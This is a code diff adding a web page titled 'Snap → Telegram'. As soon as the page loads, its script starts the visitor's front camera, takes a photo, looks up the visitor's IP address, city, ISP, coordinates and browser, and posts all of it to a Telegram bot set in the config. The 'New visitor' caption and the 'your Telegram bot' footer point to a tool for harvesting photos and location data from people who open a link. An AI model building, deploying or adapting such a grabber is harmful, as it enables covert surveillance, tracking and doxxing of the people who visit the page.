@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap → Telegram</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="card">
+  <h1>Snap → Telegram</h1>
+  <p class="subtitle">Captures a photo and sends it with your IP</p>
+
+  <div class="frame">
+    <div class="live-dot"><span></span>Live</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <div id="status">Starting camera…</div>
+  <button id="retry">Retry</button>
+</div>
+
+<p class="footer">Camera + IP → your Telegram bot</p>
+
+<script>
+// ================= CONFIG =================
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+// ==========================================
+
+const video  = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const status = document.getElementById('status');
+const retry  = document.getElementById('retry');
+const liveDot = document.querySelector('.live-dot');
+
+function setStatus(text, kind) {
+  status.textContent = text;
+  status.className = kind || '';
+}
+
+async function getIPInfo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (!r.ok) throw new Error('ip api failed');
+    return await r.json();
+  } catch {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const j = await r.json();
+      return { ip: j.ip };
+    } catch { return { ip: 'unknown' }; }
+  }
+}
+
+function sendToTelegram(photoBlob, ipInfo) {
+  const form = new FormData();
+  form.append('chat_id', CHAT_ID);
+
+  const caption =
+`📸 New visitor
+IP: ${ipInfo.ip || 'unknown'}
+City: ${ipInfo.city || '-'}, ${ipInfo.region || '-'}, ${ipInfo.country_name || ipInfo.country || '-'}
+ISP: ${ipInfo.org || '-'}
+Lat/Lon: ${ipInfo.latitude || '-'}, ${ipInfo.longitude || '-'}
+UA: ${navigator.userAgent}`;
+
+  form.append('caption', caption);
+  form.append('photo', photoBlob, 'snapshot.jpg');
+
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: form
+  }).then(r => r.json());
+}
+
+async function start() {
+  retry.style.display = 'none';
+  setStatus('Requesting camera…');
+
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 640, height: 480 },
+      audio: false
+    });
+  } catch (e) {
+    setStatus('Camera error: ' + e.message + ' (needs HTTPS or localhost)', 'err');
+    retry.style.display = 'block';
+    return;
+  }
+
+  video.srcObject = stream;
+  await video.play();
+
+  // Give the camera a moment to focus/expose
+  await new Promise(r => setTimeout(r, 1200));
+
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // Show the snapshot
+  video.style.display = 'none';
+  canvas.style.display = 'block';
+  liveDot.style.display = 'none';
+
+  // Stop the camera
+  stream.getTracks().forEach(t => t.stop());
+
+  setStatus('Fetching IP…');
+  const ipInfo = await getIPInfo();
+
+  setStatus('Sending to Telegram…');
+  canvas.toBlob(async (blob) => {
+    try {
+      const res = await sendToTelegram(blob, ipInfo);
+      if (res.ok) {
+        setStatus('✅ Sent to Telegram!', 'ok');
+      } else {
+        setStatus('❌ Telegram error: ' + (res.description || JSON.stringify(res)), 'err');
+        retry.style.display = 'block';
+      }
+    } catch (e) {
+      setStatus('❌ Network error: ' + e.message, 'err');
+      retry.style.display = 'block';
+    }
+  }, 'image/jpeg', 0.85);
+}
+
+retry.addEventListener('click', start);
+start();
+</script>
+</body>
+</html>
